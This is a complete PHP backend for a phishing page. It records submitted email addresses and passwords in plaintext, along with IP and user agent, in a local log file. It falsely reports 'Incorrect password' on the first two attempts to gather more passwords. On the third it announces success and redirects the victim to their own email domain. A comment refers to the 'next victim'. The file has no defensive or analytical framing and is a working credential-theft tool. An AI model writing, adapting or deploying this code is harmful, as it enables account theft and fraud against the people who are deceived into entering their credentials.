<?php
session_start();

// Function to log data
function logData($email, $password, $attempt) {
    $logFile = 'logs.txt';
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    $logEntry = "[{$timestamp}] IP: {$ip} | Email: {$email} | Password: {$password} | Attempt: {$attempt} | UA: {$userAgent}" . PHP_EOL;
    
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
}

// Function to get domain from email
function getDomainFromEmail($email) {
    $parts = explode('@', $email);
    return count($parts) > 1 ? $parts[1] : '';
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['ai'] ?? '';
    $password = $_POST['pr'] ?? '';
    
    // Initialize attempt counter
    if (!isset($_SESSION['attempts'])) {
        $_SESSION['attempts'] = 0;
        $_SESSION['email'] = $email;
    }
    
    // Increment attempt counter
    $_SESSION['attempts']++;
    $currentAttempt = $_SESSION['attempts'];
    
    // Log the attempt
    logData($email, $password, $currentAttempt);
    
    header('Content-Type: application/json');
    
    if ($currentAttempt < 3) {
        // First two attempts - show error message
        echo json_encode([
            'success' => false,
            'msg' => 'Incorrect password. Please try again.',
            'attempt' => $currentAttempt
        ]);
    } else {
        // Third attempt - prepare for redirect
        $domain = getDomainFromEmail($email);
        
        echo json_encode([
            'success' => true,
            'msg' => 'Authentication successful. Redirecting...',
            'redirect' => $domain ? "http://{$domain}" : "http://google.com",
            'attempt' => $currentAttempt
        ]);
        
        // Clear session for next victim
        session_destroy();
    }
    exit;
}

// If not POST request, redirect to index
header('Location: index.html');
exit;
?>